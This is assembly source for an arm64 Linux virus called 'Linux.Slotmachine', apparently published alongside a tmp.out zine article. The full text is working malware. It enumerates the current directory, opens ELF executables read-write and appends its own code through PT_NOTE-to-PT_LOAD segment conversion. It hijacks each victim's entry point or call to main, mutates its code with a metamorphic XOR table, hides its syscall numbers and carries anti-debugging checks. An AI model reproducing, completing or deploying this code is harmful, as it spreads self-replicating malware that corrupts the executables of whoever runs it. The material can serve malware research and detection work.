//
//      |     . |                   |    o
// ,---.|    / \|--- ,-.-.,---.,---.|---..,---.,---.
// `---.|       |    | | |,---||    |   |||   ||---'
// `---'`---'   `---'` ' '`---^`---'`   '``   '`---'
//
// Linux.Slotmachine
// by vrzh
//
// An arm64 virus that implements the jackp^t
// metamorphic engine and a few obfuscation
// techniques.
//
// NOTE: This is an auto-generated file
//       For build instructions please 
//       refer to the article in tmp.out #4
//       and the github repository
//
// Stack layout
// 0      - CTR_EL0 cooked value
// 8      - target dir fd
// 16     - new target size
// 24     - target fd
// 32     - target struct stat
//     80 - st_size
// 176    - dirent buff
// 464    - tmp buff for elfmag comparison
// 472    - dirent64 retval
// 480    - dirent64 struct offt
// 488    - revert ftrunc?
// 496    - entry file offt
// 504    - file offt end of executable PT_LOAD
// 512    - virus base vaddr
// 520    - base PT_LOAD vaddr
// 528    - ptr to end of virus in target
// 536    - second instruction is ldr

virstart:
    stp x29, x30, [sp, -16]!
    stp x0, x1, [sp, -16]!
    stp x2, x3, [sp, -16]!

    mrs x0, DCZID_EL0
    mrs x1, CTR_EL0
    add x0, x1, x0
    and x0, x0, 0x80000000
    mov x0, x0, LSR 22
    add x1, x0, 32
    sub sp, sp, x1         // 0x220

    mov x0, x0, LSL 22
    str x0, [sp]
// PTRACE_TRACEME test
    mov x8, x0
    mov x8, x8, LSR 24
    sub x8, x8, 11
    mov x2, x8, LSR 7
    mov x1, x8, LSR 7
    mov x3, x8, LSR 7
    mov x0, x8, LSR 7
    svc 0
    tbnz x0, 63, die

// openat_dir
    eor x0, x1, x1
    ldr x8, [sp]
    mov x1, x8, LSR 24
    sub x0, x0, x1
    add x0, x0, 28         // -100
    adr x1, target_cmp
elf_magic_third:
    ubfiz x28, x7, 1, 0x14 // d37f4cfc
    add x1, x1, 1
    eor x2, x1, x1         // O_RDONLY
    mov x8, x8, LSR 25
    sub x8, x8, 8
    svc 0                  // openat
    tbnz x0, 63, end
    str x0, [sp, 8]

dir_infect:
    ldr x0, [sp, 8]
    add x1, sp, 176
    ldr x2, [sp]
    mov x2, x2, LSR 23
    add x2, x2, 0x20       // 0x120
    ldr x8, [sp]
    mov x8, x8, LSR 25
    sub x8, x8, 3
    svc 0                  // getdents64
    tbnz x0, 63, end
    cbz x0, end
    str x0, [sp, 472]
    str xzr, [sp, 480]
file_loop:
    add x3, sp, 176
    ldr x4, [sp, 480]
    add x3, x3, x4
    ldrb w4, [x3, d_type]
    cmp w4, 8              // DT_REG
    b.ne dir_infect_continue

// openat
    ldr x0, [sp, 8]
    add x1, x3, d_name
    mov x2, 2              // O_RDWR
    ldr x8, [sp]
    mov x8, x8, LSR 25
    sub x8, x8, 8
    svc 0
    tbnz x0, 63, dir_infect_continue
    str x0, [sp, 24]

// read_magic
    add x1, sp, 464
    mov x2, 5
    ldr x8, [sp]
    mov x8, x8, LSR 25
    sub x8, x8, 1
    svc 0
    tbnz x0, 63, close
    add x0, sp, 464
    adr x1, patch_start
    add x1, x1, 2
    ldrb w9, [x0], 1
    ldrb w10, [x1], 1
    cmp w9, w10
    b.ne close
    adr x1, patch_start
    add x1, x1, 1
    ldrb w9, [x0], 1
    ldrb w10, [x1], 1
    cmp w9, w10
    b.ne close
    adr x1, elf_magic_third
    add x1, x1, 1
    ldrb w9, [x0], 1
    ldrb w10, [x1], 1
    cmp w9, w10
    b.ne close
    adr x1, elf_magic_fourth
    add x1, x1, 2
    ldrb w9, [x0], 1
    ldrb w10, [x1], 1
    cmp w9, w10
    b.ne close
    adr x1, elf_magic_fifth 
    ldrb w9, [x0], 1
    ldrb w10, [x1], 1
    cmp w9, w10
    b.ne close

    ldr x0, [sp, 24]
    b infect_file

revert_trunc:
    ldr x0, [sp, 24]       // fd
    ldr x1, [sp, 80]       // st_size
    ldr x8, [sp]
    mov x8, x8, LSR 25
    sub x8, x8, 18
    svc 0

close:
    ldr x0, [sp, 24]
    ldr x8, [sp]
    mov x8, x8, LSR 25
    sub x8, x8, 7
    svc 0
elf_magic_fourth:
    lsr x12, x2, 6         // d346fc4c

dir_infect_continue:
    ldr x0, [sp, 480]
    add x1, sp, 176
    add x1, x1, x0
    ldrh w1, [x1, d_reclen]
    add x0, x0, x1
    str x0, [sp, 480]
elf_magic_fifth:
    lsr x2, x0, 0x3f       // d37ffc02
    ldr x2, [sp, 472]
    cmp x0, x2
    b.lt file_loop
    b dir_infect

// infect_file(int candidate_fd)
infect_file:
    str xzr, [sp, 488]
// fseek
    eor x1, x1, x1
    eor x2, x2, x2
    ldr x8, [sp]
    mov x8, x8, LSR 25
    sub x8, x8, 2
    svc 0
    cbnz x0, close

// fstat
    ldr x0, [sp, 24]
    add x1, sp, 32
    ldr x8, [sp]
    mov x8, x8, LSR 24
    sub x8, x8, 48
    svc 0
    cbnz x0, close
    ldr x1, [sp, 80]       // st_size
    mov x2, 0x40
    cmp x1, x2
    b.le close

// ftruncate
    ldr x0, [sp, 24]
    adr x2, virend
    adr x3, virstart
    sub x2, x2, x3
    add x2, x2, 0x20000
    and x2, x2, 0xffffffffffff0000
    add x1, x1, x2
    str x1, [sp, 16]
    ldr x8, [sp]
    mov x8, x8, LSR 25
    sub x8, x8, 18
    svc 0
    cbnz x0, close

// mmap
    eor x0, x0, x0
    ldr x1, [sp, 16]
    mov x2, 2              // PROT_RW
    mov x3, 1              // MAP_SHARED
    ldr x4, [sp, 24]
    eor x5, x5, x5
    ldr x8, [sp]
    mov x8, x8, LSR 23
    sub x8, x8, 34
    svc 0
    tbnz x0, 63, revert_trunc

// implement PT_NOTE infection
// phdrs_check
    // sanity checks
    ldr x1, [x0, e_phoff]
    ldr x2, [sp, 80]       // original st_size
    cmp x2, x1
    b.lt munmap
    ldrh w3, [x0, e_phentsize]
    ldrh w4, [x0, e_phnum]
    ldrh w20, [x0, e_phnum]
    eor x21, x21, x21
target_cmp:
    cmp w20, 0xb
    mul x3, x3, x4
    add x3, x3, x1
    cmp x2, x3
    b.lt munmap
    add x1, x1, x0
    ldrh w2, [x0, e_phentsize]
    ldrh w3, [x0, e_phnum]
    eor x5, x5, x5
    str x5, [sp, 512]
    str x5, [sp, 520]
phdrs_loop:
    cbz w3, munmap
    // looking for the segment at the highest offset
    // in order to calculate a safe base addr
    ldr x12, [x1, p_vaddr]
    ldr x11, [x1, p_memsz]
    add x11, x11, x12
    add x11, x11, 0x10000
    and x11, x11, 0xffffffffffff0000
    ldr x12, [sp, 512]
    cmp x11, x12
    b.le segment_lower_in_mem
    str x11, [sp, 512]
segment_lower_in_mem:
    ldr w4, [x1, p_type]
    cbnz x5, check_pt_note
    cmp w4, 1              // PT_LOAD
    // until we find exec PT_LOAD
    // we ain't infecting
    b.ne phdrs_loop_cont

    // store the first PT_LOAD segment's 
    // virt addr - we're assuming the first
    // PT_LOAD segment is the base elf address
    cbnz x21, check_if_exec
    ldr x5, [x1, p_vaddr]
    str x5, [sp, 520]
    eor x5, x5, x5
    movz x21, 1

check_if_exec:
    ldr x6, [x1, p_flags]
    and x6, x6, 1
    cbz x6, phdrs_loop_cont

    // we found first exec PT_LOAD:
    // time to check if we've infected
    // this binary before
    ldr x6, [x0, e_entry]
    ldr x5, [sp, 520]
    sub x6, x6, x5
    tbnz x6, 63, munmap
    str x6, [sp, 496]
    ldr x6, [x0, e_entry]
    ldr x5, [x1, p_vaddr]
    // sub virtual addr base
    sub x6, x6, x5
    tbnz x6, 63, munmap
    movz x5, 1
    ldr x8, [x1, p_offset]
    add x6, x6, x8
    ldr x7, [sp, 80]       // original st_size
    // if entry is past the original
    // file size we bail
    cmp x7, x6
    b.le munmap
    ldr x12, [x1, p_filesz]
    add x12, x12, x8
    str x12, [sp, 504]
    ldr x6, [sp, 496]
    add x8, x0, x6
check_infect_loop:
    ldr w9, [x8]
    mov w10, w9, LSR 24
    and w11, w10, 31
    cmp w11, 16
    b.ne check_infect_loop_cont
    mov w10, w10, LSR 7
    cmp w10, 1
    b.ne check_infect_loop_cont
    ldr w10, [x8, 4]
    adr x11, inst
    ldr w11, [x11]
    cmp w10, w11
    b.eq munmap
    b phdrs_loop_cont

check_infect_loop_cont:
    add x8, x8, 4
    add x6, x6, 4
    cmp x12, x6
    b.le munmap
    ldr w9, [x8]
    mov w10, w9, LSR 26
    cmp w10, 37
    b.eq munmap
    b check_infect_loop

check_pt_note:
    cmp w4, 4              // PT_NOTE
    b.ne phdrs_loop_cont
    // Found PT_NOTE: turn it to PT_LOAD
    // Did we find an exec load?
    // If PT_NOTE is before the executable PT_LOAD
    // something's weird and we don't want this binary
    cbz x5, munmap
    // -- old instr
    movz w4, 1             // PT_LOAD
    str w4, [x1, p_type]
    ldr w4, [x1, p_flags]
    orr w4, w4, 1
    str w4, [x1, p_flags]
    // The file offset has to
    // be page aligned as well
    ldr x4, [sp, 80]
    add x4, x4, 0x10000
    and x4, x4, 0xffffffffffff0000
    str x4, [x1, p_offset]
    mov x4, 0x10000
    str x4, [x1, p_align]
    mov x4, 0x10000
    str x4, [x1, p_filesz]
    str x4, [x1, p_memsz]
    ldr x4, [sp, 512]
    str x4, [x1, p_vaddr]
    str x4, [x1, p_paddr]
    b write_code

phdrs_loop_cont:
    sub w3, w3, 1
    add x1, x1, x2
    b phdrs_loop

// x1 virus in mapped target
// x2 self virus start ptr
// x3 morph table
// x8 morph table ptr
// x9 instruction idx
write_code:
    ldr x1, [sp, 80]
    add x1, x1, 0x10000
    and x1, x1, 0xffffffffffff0000
    add x1, x1, x0
    adr x2, virstart
    adr x3, morph_tbl      // code terminating ptr
    adr x8, morph_tbl
    adr x13, morph_tbl_end // morph tbl terminating ptr
    eor x9, x9, x9
    eor w14, w14, w14
write_loop:
    cmp x8, x13
    b.eq write_loop_cont_no_morph
    ldrh w10, [x8]
    cmp x9, x10
    b.ne write_loop_cont_no_morph
    
    ldrh w10, [x8], 2

    ldrb w10, [x8], 1      // rot idx : rot max
    ldrb w14, [x8], 1      // num inst
    mov w15, w14
    sub w14, w14, 1
    and w11, w10, 0xf
    mov w10, w10, lsr 4

write_cont_morph:
    // we have a separate loop for the morph
    // table, which will increment each index.
    mov x12, x10, LSL 2
    mul x12, x12, x15
    add x12, x8, x12
    
    // sub array of instr
    ldr w10, [x12], 4

    // move the morph tbl pointer
    add x11, x11, 1
    mov x11, x11, LSL 2
    mul x11, x11, x15
    add x8, x8, x11

    b write_loop_cont

write_loop_cont_no_morph:
    eor x10, x10, x10
write_loop_cont:
    ldr x4, [x2], 4
    eor x4, x4, x10
    str w4, [x1], 4
    add x9, x9, 1
    cmp w14, wzr
    b.eq write_loop_cont_cont
    sub w14, w14, 1
    ldr x10, [x12], 4
    b write_loop_cont
write_loop_cont_cont:
    cmp x2, x3
    b.ne write_loop

    adr x3, morph_tbl_end  // terminating ptr
write_morph_tbl_loop:
    ldrh w10, [x2], 2
    strh w10, [x1], 2
    
    ldrb w10, [x2], 1
    and w11, w10, 0xf
    mov w10, w10, LSR 4

    cmp w10, w11
    b.ne inc_idx
    eor x10, x10, x10
    sub x10, x10, 1
inc_idx:
    add w10, w10, 1
    mov w10, w10, LSL 4
    add w10, w10, w11
    strb w10, [x1], 1

    // number of instructions
    ldrb w14, [x2], 1
    strb w14, [x1], 1
    add w11, w11, 1
    mul w11, w14, w11
    sub w11, w11, 1

keys_copy_loop: 
    ldr w12, [x2], 4
    str w12, [x1], 4
    cmp w11, wzr
    b.eq morph_tbl_loop_cont
    sub w11, w11, 1
    b keys_copy_loop

morph_tbl_loop_cont:
    cmp x2, x3
    b.ne write_morph_tbl_loop
    str wzr, [x1], 4

    adr x6, virend
    adr x7, return_to_main
    sub x6, x6, x7
    sub x1, x1, x6
    str x1, [sp, 528]

    ldr x6, [sp, 496]
    ldr x7, [sp, 504]
    add x1, x6, x0

patch_start_loop:
    ldr w2, [x1]
    mov w3, w2, LSR 24
    and w4, w3, 31
    cmp w4, 16
    b.ne patch_start_loop_cont
    mov w3, w3, LSR 7
    cmp w3, 1
    b.ne patch_start_loop_cont
    // found adrp
    mov w3, w2, LSR 5
    mov w3, w3, LSL 2
    mov w4, w2, LSR 29
    and w4, w4, 3
    add w3, w3, w4
    mov w3, w3, LSL 12
    // adrp immediate
    // check whether next instruction
    // is add or ldr
    ldr w2, [x1, 4]
    mov w4, w2, LSR 23
    // is it add 
    cmp w4, 0x122
    b.eq disassemble_add
    mov w4, w2, LSR 22
    // is it ldr
    cmp w4, 0x3e5
    b.eq disassemble_ldr
    b munmap

disassemble_add:
    mov w4, w2, LSR 10
    and w4, w4, 0xfff
    str xzr, [sp, 536]
    b patch_start

disassemble_ldr:
    mov w4, w2, LSR 10
    and w4, w4, 0xfff
    mov x4, x4, LSL 3
    movz x2, 1
    str x2, [sp, 536]

patch_start: 
    // d37f45fc
    ubfiz x28, x15, 1, 0x12
    ldr x5, [sp, 520]
    add x5, x5, x6
    add x5, x5, x3
    and x5, x5, 0xfffffffffffff000
    add x5, x5, x4         // GOT main or main virt address
    ldr x4, [sp, 512]
    adr x2, return_to_main // wherever the final branch is
    adr x3, virstart
    sub x2, x2, x3
    add x4, x4, x2
    sub x4, x5, x4         // offset from final branch
    ldr x2, [sp, 536]
    cbnz x2, make_adrp

make_branch:
    mov x4, x4, LSR 2
    and x4, x4, 0x3ffffff
    ldr x5, [sp]
    mov x5, x5, LSR 29
    add x5, x5, 1
    mov x5, x5, LSL 26
    add x5, x5, x4
    ldr x4, [sp, 528]
    str x5, [x4]
    b ret_patched

make_adrp:
    mov x5, x4, LSR 12
    and x5, x5, 0x1fffff
    ldr x3, [sp]
    mov x3, x3, LSR 28
    add x3, x3, 1
    mov x3, x3, LSL 28
    mov x2, x5, LSR 2
    mov x2, x2, LSL 5
    add x3, x3, x2
    and x2, x5, 3
    mov x2, x2, LSL 29
    add x3, x3, x2
    add x3, x3, 8
    ldr x2, [sp, 528]
    str x3, [x2]
    and x5, x4, 0xfff
    adr x2, return_to_main // wherever the final branch is
    adr x3, virstart
    sub x2, x2, x3
    and x2, x2, 0xfff
    mov x3, 0x1000
    sub x3, x3, x5
    cmp x2, x3
    b.lt underflow_handle
    sub x2, x2, x3
    b make_adrp_patch

underflow_handle:
    add x2, x2, x5

make_adrp_patch:
    ldr x3, [sp]
    mov x2, x2, LSL 10
    add x3, x3, x2
    mov x2, 8
    add x3, x3, x2
    mov x2, x2, LSL 5
    add x3, x3, x2
    mov x2, 0x11
    mov x2, x2, LSL 24
    add x3, x3, x2
    ldr x2, [sp, 528]
    str x3, [x2, 4]
    ldr x3, [sp]
    mov x3, x3, LSR 26
    sub x3, x3, 1
    mov x3, x3, LSL 5
    add x3, x3, 5
    mov x3, x3, LSL 17
    add x3, x3, 8
    mov x3, x3, LSL 5
    add x3, x3, 8
    str x3, [x2, 8]
    ldr x3, [sp]
    mov x4, 0x2b
    mov x4, x4, LSL 25
    add x3, x3, x4
    ldr x4, [sp]
    mov x4, x4, LSR 26
    sub x4, x4, 1
    mov x4, x4, LSL 16
    add x3, x3, x4
    ldr x4, [sp]
    mov x4, x4, LSR 23
    add x3, x3, x4
    str x3, [x2, 12]

ret_patched:
    ldr x3, [sp]
    mov x3, x3, LSR 28
    add x3, x3, 1
    mov x3, x3, LSL 28
    ldr x4, [sp, 512]
    ldr x10, [sp, 520]
    add x10, x10, x6
    mov x6, x10, LSR 12
    mov x4, x4, LSR 12
    sub x4, x4, x6
    ldr x8, [sp]
    mov x8, x8, LSR 11
    sub x8, x8, 1
    cmp x8, x4
    // we're too far from the _start stub
    b.lt alternative_infect
    mov x5, x4, LSR 2
    mov x5, x5, LSL 5
    add x3, x3, x5
    and x5, x4, 3
    mov x5, x5, LSL 29
    add x3, x3, x5
    str w3, [x1]
    // check and parse whether add or ldr
    adr x3, inst
    ldr w3, [x3]
    str w3, [x1, 4]
    b infect_success
    // fall back to direct entry point hijacking
    // another option is to fail if non-greedy 
    // infection is preferred
alternative_infect:
    ldr x4, [sp, 512]
    str x4, [x0, e_entry]
    b infect_success

patch_start_loop_cont:
    add x1, x1, 4
    add x6, x6, 4
    cmp x7, x6
    b.le munmap
    ldr w2, [x1]
    mov w3, w2, LSR 26
    cmp w3, 37
inst:
    nop
    b.eq munmap
    b patch_start_loop

infect_success:
    ldr x1, [sp]
    mov x1, x1, LSR 31
    str x1, [sp, 488]
munmap:
    ldr x1, [sp, 16]
    ldr x8, [sp]
    mov x8, x8, LSR 23
    sub x8, x8, 41
    svc 0
    ldr x9, [sp, 488]
    cbz x9, revert_trunc
    b close

end:
    ldr x0, [sp, 8]        // close directory fd
    ldr x8, [sp]
    mov x8, x8, LSR 25
    sub x8, x8, 7
    svc 0

    // print a delightful message
    eor x0, x0, x0
    add x0, x0, 1
    adr x1, printme
    mov x2, 8
    ldr x8, [sp]
    mov x8, x8, LSR 24
    sub x8, x8, 64
    svc 0

die:
    eor x0, x1, x1
    ldr x8, [sp]
    mov x8, x8, LSR 24
    sub x8, x8, 35
    ldr x1, [sp]
    mov x1, x1, LSR 22
    add x1, x1, 32
    add sp, sp, x1
    ldp x2, x3, [sp], 16
    ldp x0, x1, [sp], 16
    ldp x29, x30, [sp], 16
return_to_main:
    nop
    nop
    nop
    nop
    svc 0

printme:
    .int 0x544f4c53
    .int 0x0000000a

morph_tbl:
    .short 3
    .byte 0x01
    .byte 0x02
    .int 0x000000c1
    .int 0x000000c1
    .int 0x00000000
    .int 0x00000000
    .short 5
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 21
    .byte 0x09
    .byte 0x01
    .int 0x000d01a0
    .int 0x001b0360
    .int 0x60080100
    .int 0x601b0360
    .int 0x00110220
    .int 0x00140280
    .int 0x001c0380
    .int 0x00110220
    .int 0x60130260
    .int 0x601e03c0
    .short 29
    .byte 0x09
    .byte 0x01
    .int 0x00000000
    .int 0x001c0380
    .int 0x00000000
    .int 0x000700e0
    .int 0x00030060
    .int 0x00110220
    .int 0x001b0360
    .int 0x600c0180
    .int 0x60040080
    .int 0x001a0340
    .short 50
    .byte 0x00
    .byte 0x01
    .int 0x000700e0
    .short 102
    .byte 0x02
    .byte 0x03
    .int 0x00000c08
    .int 0x00002401
    .int 0x00002809
    .int 0x00002809
    .int 0x00000c08
    .int 0x00002401
    .int 0x00002401
    .int 0x00002809
    .int 0x00000c08
    .short 108
    .byte 0x01
    .byte 0x02
    .int 0x00000c08
    .int 0x00000c08
    .int 0x00000000
    .int 0x00000000
    .short 116
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 118
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 126
    .byte 0x09
    .byte 0x01
    .int 0x00100200
    .int 0x000a0140
    .int 0x001e03c0
    .int 0x00030060
    .int 0x00130260
    .int 0x001602c0
    .int 0x00110220
    .int 0x00090120
    .int 0x000e01c0
    .int 0x00140280
    .short 127
    .byte 0x09
    .byte 0x01
    .int 0x000f01e0
    .int 0x00190320
    .int 0x00110220
    .int 0x001602c0
    .int 0x00100200
    .int 0x001e03c0
    .int 0x000c0180
    .int 0x000c0180
    .int 0x00090120
    .int 0x001602c0
    .short 150
    .byte 0x00
    .byte 0x01
    .int 0x00030060
    .short 157
    .byte 0x09
    .byte 0x01
    .int 0x000b0160
    .int 0x001602c0
    .int 0x000500a0
    .int 0x00190320
    .int 0x00010020
    .int 0x001702e0
    .int 0x00010020
    .int 0x000d01a0
    .int 0x00100200
    .int 0x000b0160
    .short 162
    .byte 0x09
    .byte 0x01
    .int 0x000500a0
    .int 0x00100200
    .int 0x00190320
    .int 0x001a0340
    .int 0x00090120
    .int 0x600500a0
    .int 0x600e01c0
    .int 0x00130260
    .int 0x000e01c0
    .int 0x00090120
    .short 168
    .byte 0x02
    .byte 0x02
    .int 0x00000000
    .int 0x00000000
    .int 0x00003be3
    .int 0x00003be3
    .int 0x00000000
    .int 0x00000000
    .short 175
    .byte 0x09
    .byte 0x01
    .int 0x00010020
    .int 0x00180300
    .int 0x000d01a0
    .int 0x00020040
    .int 0x00110220
    .int 0x00040080
    .int 0x001f03e0
    .int 0x000e01c0
    .int 0x001602c0
    .int 0x00040080
    .short 178
    .byte 0x00
    .byte 0x01
    .int 0x00020040
    .short 181
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 184
    .byte 0x09
    .byte 0x01
    .int 0x000d01a0
    .int 0x00190320
    .int 0x00010020
    .int 0x00040080
    .int 0x00000000
    .int 0x001b0360
    .int 0x00010020
    .int 0x001b0360
    .int 0x001d03a0
    .int 0x000d01a0
    .short 188
    .byte 0x00
    .byte 0x02
    .int 0x00001c07
    .int 0x00001c07
    .short 190
    .byte 0x00
    .byte 0x01
    .int 0x000700e0
    .short 204
    .byte 0x09
    .byte 0x01
    .int 0x000500a0
    .int 0x000e01c0
    .int 0x001502a0
    .int 0x00180300
    .int 0x000500a0
    .int 0x00030060
    .int 0x00010020
    .int 0x001602c0
    .int 0x00130260
    .int 0x00040080
    .short 220
    .byte 0x00
    .byte 0x01
    .int 0x000e01c0
    .short 225
    .byte 0x00
    .byte 0x01
    .int 0x00040080
    .short 228
    .byte 0x00
    .byte 0x01
    .int 0x000600c0
    .short 274
    .byte 0x00
    .byte 0x01
    .int 0x00030060
    .short 279
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 284
    .byte 0x09
    .byte 0x01
    .int 0x000b0160
    .int 0x000700e0
    .int 0x001c0380
    .int 0x001f03e0
    .int 0x001702e0
    .int 0x00110220
    .int 0x00080100
    .int 0x001c0380
    .int 0x000600c0
    .int 0x001b0360
    .short 285
    .byte 0x09
    .byte 0x01
    .int 0x00180300
    .int 0x000b0160
    .int 0x000c0180
    .int 0x00180300
    .int 0x000e01c0
    .int 0x00030060
    .int 0x001d03a0
    .int 0x000a0140
    .int 0x000b0160
    .int 0x001602c0
    .short 300
    .byte 0x00
    .byte 0x01
    .int 0x00040080
    .short 305
    .byte 0x00
    .byte 0x01
    .int 0x00030060
    .short 307
    .byte 0x09
    .byte 0x01
    .int 0x00090120
    .int 0x00190320
    .int 0x00120240
    .int 0x00030060
    .int 0x00190320
    .int 0x001c0380
    .int 0x000e01c0
    .int 0x001502a0
    .int 0x00010020
    .int 0x001e03c0
    .short 327
    .byte 0x09
    .byte 0x01
    .int 0x000f01e0
    .int 0x001c0380
    .int 0x00190320
    .int 0x001d03a0
    .int 0x000e01c0
    .int 0x00080100
    .int 0x000b0160
    .int 0x00020040
    .int 0x001c0380
    .int 0x00040080
    .short 331
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 352
    .byte 0x01
    .byte 0x02
    .int 0x00000000
    .int 0x00000000
    .int 0x00000401
    .int 0x00000401
    .short 354
    .byte 0x00
    .byte 0x01
    .int 0x000600c0
    .short 367
    .byte 0x00
    .byte 0x01
    .int 0x000700e0
    .short 388
    .byte 0x00
    .byte 0x01
    .int 0x00030060
    .short 389
    .byte 0x00
    .byte 0x01
    .int 0x000600c0
    .short 391
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 396
    .byte 0x00
    .byte 0x01
    .int 0x000600c0
    .short 406
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 418
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 421
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 436
    .byte 0x00
    .byte 0x01
    .int 0x000700e0
    .short 439
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 441
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 443
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 446
    .byte 0x00
    .byte 0x01
    .int 0x00010020
    .short 462
    .byte 0x00
    .byte 0x01
    .int 0x000700e0
    .short 467
    .byte 0x00
    .byte 0x01
    .int 0x000700e0
    .short 470
    .byte 0x00
    .byte 0x01
    .int 0x000700e0
    .short 476
    .byte 0x02
    .byte 0x02
    .int 0x00000000
    .int 0x00000000
    .int 0x00000000
    .int 0x00000000
    .int 0x0000040e
    .int 0x0000040e
    .short 478
    .byte 0x00
    .byte 0x01
    .int 0x000c0180
    .short 489
    .byte 0x00
    .byte 0x01
    .int 0x000600c0
    .short 492
    .byte 0x00
    .byte 0x01
    .int 0x000600c0
    .short 514
    .byte 0x02
    .byte 0x02
    .int 0x00000809
    .int 0x00000809
    .int 0x00000000
    .int 0x00000000
    .int 0x00000000
    .int 0x00000000
    .short 522
    .byte 0x00
    .byte 0x02
    .int 0x0000408
    .int 0x0000408
    .short 527
    .byte 0x09
    .byte 0x01
    .int 0x00080100
    .int 0x001a0340
    .int 0x001702e0
    .int 0x001f03e0
    .int 0x00100200
    .int 0x00100200
    .int 0x00140280
    .int 0x001d03a0
    .int 0x00090120
    .int 0x001a0340
    .short 535
    .byte 0x09
    .byte 0x01
    .int 0x000b0160
    .int 0x00040080
    .int 0x00010020
    .int 0x00140280
    .int 0x000a0140
    .int 0x001a0340
    .int 0x000e01c0
    .int 0x00110220
    .int 0x00010020
    .int 0x00140280
    .short 551
    .byte 0x04
    .byte 0x01
    .int 0x1c0c0d1e
    .int 0x69060f04
    .int 0x6a060f03
    .int 0x6a170e1a
    .int 0x751b0303
morph_tbl_end:
    .int 0
virend:

// ELF Header
    .struct 0
e_ident:
    .struct e_ident + 16
e_type:
    .struct e_type + 2
e_machine:
    .struct e_machine + 2
e_version:
    .struct e_version + 4
e_entry:
    .struct e_entry + 8
e_phoff:
    .struct e_phoff + 8
e_shoff:
    .struct e_shoff + 8
e_flags:
    .struct e_flags + 4
e_ehsize:
    .struct e_ehsize + 2
e_phentsize:
    .struct e_phentsize + 2
e_phnum:
    .struct e_phnum + 2
e_shentsize:
    .struct e_shentsize + 2
e_shnum:
    .struct e_shnum + 2
e_shstrndx:

// PHDR
    .struct 0
p_type:
    .struct p_type + 4
p_flags:
    .struct p_flags + 4
p_offset:
    .struct p_offset + 8
p_vaddr:
    .struct p_vaddr + 8
p_paddr:
    .struct p_paddr + 8
p_filesz:
    .struct p_filesz + 8
p_memsz:
    .struct p_memsz + 8
p_align:

// dirent64
    .struct 0
d_ino:
    .struct d_ino + 8
d_off:
    .struct d_off + 8
d_reclen:
    .struct d_reclen + 2
d_type:
    .struct d_type + 1
d_name:
